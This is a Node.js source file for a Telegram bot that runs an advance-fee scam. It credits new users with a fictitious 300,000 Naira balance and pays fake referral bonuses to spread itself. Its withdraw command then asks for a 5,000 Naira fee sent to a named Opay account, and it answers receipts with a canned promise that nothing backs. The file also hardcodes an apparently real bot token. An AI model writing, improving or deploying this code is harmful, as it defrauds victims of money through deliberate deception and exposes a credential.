const TelegramBot = require('node-telegram-bot-api');

// Replace with your actual bot token from BotFather
const token = '7819660089:AAGj_m2qIv6RiYQPFsSPdkjzfELJOssArVc';

// Create a bot that uses polling to fetch new updates
const bot = new TelegramBot(token, { polling: true });

// Store user balances and referral data
const userData = {};

// Command to start the bot and initialize the user's balance
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const args = msg.text.split(' ');

    // Check if user already has data or is joining with a referral
    if (!userData[userId]) {
        userData[userId] = { balance: 300000, referralCount: 0 };
    }

    // Check if there’s a referral code
    if (args[1] && args[1] !== String(userId) && userData[args[1]]) {
        const referrerId = args[1];
        userData[referrerId].balance += 30000;
        userData[referrerId].referralCount += 1;
        bot.sendMessage(referrerId, `You earned 30,000 Naira from a referral! New balance: ${userData[referrerId].balance} Naira.`);
    }

    bot.sendMessage(chatId, 
        `Welcome! You have been credited with 300,000 Naira.\n` +
        `Your balance is ${userData[userId].balance} Naira.\n` +
        `Refer friends and earn 30,000 Naira each time they join with your referral link:\n` +
        `t.me/your_bot_username?start=${userId}`
    );
});

// Command to check the user's balance
bot.onText(/\/balance/, (msg) => {
    const userId = msg.from.id;
    const balance = userData[userId] ? userData[userId].balance : 0;
    bot.sendMessage(msg.chat.id, `Your current balance is ${balance} Naira.`);
});

// Command to withdraw funds
bot.onText(/\/withdraw/, (msg) => {
    const userId = msg.from.id;
    if (!userData[userId]) {
        bot.sendMessage(msg.chat.id, "To proceed with the withdrawal, please send 5,000 Naira to the following account Account:  9022734495 bank: opay.");
        return;
    }

    const balance = userData[userId].balance;
    if (balance >= 5000) {
        userData[userId].balance -= 5000;
        bot.sendMessage(
            msg.chat.id,
            "To proceed with the withdrawal, please send 5,000 Naira to the following account:\n\n" +
            "Account Number: 9022734495\nBank: opay\n\n" +
            "After completing the payment, reply with a photo of your receipt to confirm the withdrawal."
        );
    } else {
        bot.sendMessage(msg.chat.id, "Insufficient balance to make a withdrawal.");
    }
});

// Handling receipt confirmation by checking photo messages
bot.on('photo', (msg) => {
    bot.sendMessage(msg.chat.id, "Receipt received! We will process your withdrawal shortly.");
});

// Error handling for any issues with the bot
bot.on('polling_error', (error) => {
    console.log(error);  // Log error messages to the console for debugging
});